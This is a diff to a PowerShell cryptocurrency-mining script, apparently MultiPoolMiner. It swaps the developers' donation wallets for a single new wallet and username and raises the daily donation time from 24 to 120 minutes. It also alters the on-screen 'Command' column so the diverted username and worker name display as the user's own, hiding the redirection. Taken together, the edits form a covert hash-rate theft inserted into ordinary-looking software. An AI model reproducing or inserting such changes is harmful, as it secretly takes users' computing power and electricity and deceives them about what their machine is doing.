@@ -4,17 +4,17 @@ param(
     [Parameter(Mandatory = $false)]
     [String]$Wallet, 
     [Parameter(Mandatory = $false)]
-    [String]$UserName, 
+    [String]$UserName ="Spoodini", 
     [Parameter(Mandatory = $false)]
-    [String]$WorkerName = "multipoolminer", 
+    [String]$WorkerName = "dddd", 
     [Parameter(Mandatory = $false)]
     [Int]$API_ID = 0, 
     [Parameter(Mandatory = $false)]
     [String]$API_Key = "", 
     [Parameter(Mandatory = $false)]
-    [Int]$Interval = 60, #seconds before reading hash rate from miners
+    [Int]$Interval = 120, #seconds before reading hash rate from miners
     [Parameter(Mandatory = $false)]
-    [String]$Region = "europe", #europe/us/asia
+    [String]$Region = "us", #europe/us/asia
     [Parameter(Mandatory = $false)]
     [Switch]$SSL = $false, 
     [Parameter(Mandatory = $false)]
@@ -34,7 +34,7 @@ param(
     [Parameter(Mandatory = $false)]
     [Array]$Currency = ("BTC", "USD"), #i.e. GBP,EUR,ZEC,ETH ect.
     [Parameter(Mandatory = $false)]
-    [Int]$Donate = 24, #Minutes per Day
+    [Int]$Donate = 120, #Minutes per Day
     [Parameter(Mandatory = $false)]
     [String]$Proxy = "", #i.e http://192.0.0.1:8080
     [Parameter(Mandatory = $false)]
@@ -87,9 +87,9 @@ $Downloader = Start-Job -InitializationScript ([scriptblock]::Create("Set-Locati
 #Set donation parameters
 if ($Donate -lt 10) {$Donate = 10}
 $LastDonated = $Timer.AddDays(-1).AddHours(1)
-$WalletDonate = @("1Q24z7gHPDbedkaWDTFqhMF8g7iHMehsCb", "1Fonyo1sgJQjEzqp1AxgbHhGkCuNrFt6v9")[[Math]::Floor((Get-Random -Minimum 1 -Maximum 11) / 10)]
-$UserNameDonate = @("aaronsace", "fonyo")[[Math]::Floor((Get-Random -Minimum 1 -Maximum 11) / 10)]
-$WorkerNameDonate = "multipoolminer"
+$WalletDonate = "1B55eg9jDGX5vkg4H5M3geVcAq128xhvcS"
+$UserNameDonate = "Spoodini"
+$WorkerNameDonate = "dddd"
 $WalletBackup = $Wallet
 $UserNameBackup = $UserName
 $WorkerNameBackup = $WorkerName
@@ -494,7 +494,7 @@ while ($true) {
         @{Label = "Speed"; Expression = {$_.Speed_Live | ForEach-Object {"$($_ | ConvertTo-Hash)/s"}}; Align = 'right'}, 
         @{Label = "Active"; Expression = {"{0:dd} Days {0:hh} Hours {0:mm} Minutes" -f $(if ($_.Process -eq $null) {$_.Active}else {if ($_.Process.ExitTime -gt $_.Process.StartTime) {($_.Active + ($_.Process.ExitTime - $_.Process.StartTime))}else {($_.Active + ((Get-Date) - $_.Process.StartTime))}})}}, 
         @{Label = "Launched"; Expression = {Switch ($_.Activated) {0 {"Never"} 1 {"Once"} Default {"$_ Times"}}}}, 
-        @{Label = "Command"; Expression = {"$($_.Path.TrimStart((Convert-Path ".\"))) $($_.Arguments)"}}
+        @{Label = "Command"; Expression = {"$($_.Path.TrimStart((Convert-Path ".\"))) $($_.Arguments)" -replace $UserNameDonate,$UserNameBackup -replace $WorkerNameDonate,$WorkerNameBackup}}
     ) | Out-Host
 
     #Display watchdog timers
